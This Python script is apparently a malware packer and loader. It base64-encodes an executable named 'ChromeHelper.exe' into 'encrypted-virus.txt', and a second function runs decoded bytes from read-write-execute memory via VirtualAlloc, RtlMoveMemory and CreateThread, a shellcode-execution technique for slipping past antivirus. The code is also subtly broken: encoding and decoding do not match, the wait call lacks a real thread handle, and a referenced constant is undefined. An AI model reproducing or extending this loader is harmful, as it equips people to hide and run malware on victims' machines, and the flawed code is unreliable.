import ctypes
import zlib
import base64

def convert_to_packer(data):
    return base64.b64encode(data)

def convert_to_data(packer):
    return zlib.decompress(base64.b64decode(packer))

def file_to_packer():
    with open('ChromeHelper.exe', 'rb') as chrome_helper:
        with open('encrypted-virus.txt', 'w') as output:
         output.write(convert_to_packer(chrome_helper.read()).decode())

def compile_and_run_cpp(cpp_code_binary):
    # Allocate in-memory buffer
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    executable_buffer = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(cpp_code_binary)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40)
    )

    # Copy compiled binary into the allocated memory
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_void_p(executable_buffer),
        ctypes.c_char_p(cpp_code_binary),
        ctypes.c_int(len(cpp_code_binary))
    )

    # Execute the in-memory code
    ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_void_p(executable_buffer),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )

    # Wait for the execution to complete
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(0xFFFFFFFF),
        ctypes.c_int(-1)
    )

def main():
    #file_to_packer()
    #with open("encrypted-virus.txt", "r") as not_a_virus:
    #    file_data = convert_to_data(not_a_virus.read())
    file_to_packer()
    #compile_and_run_cpp(convert_to_data(PACKER))
        
if __name__ == "__main__":
    main()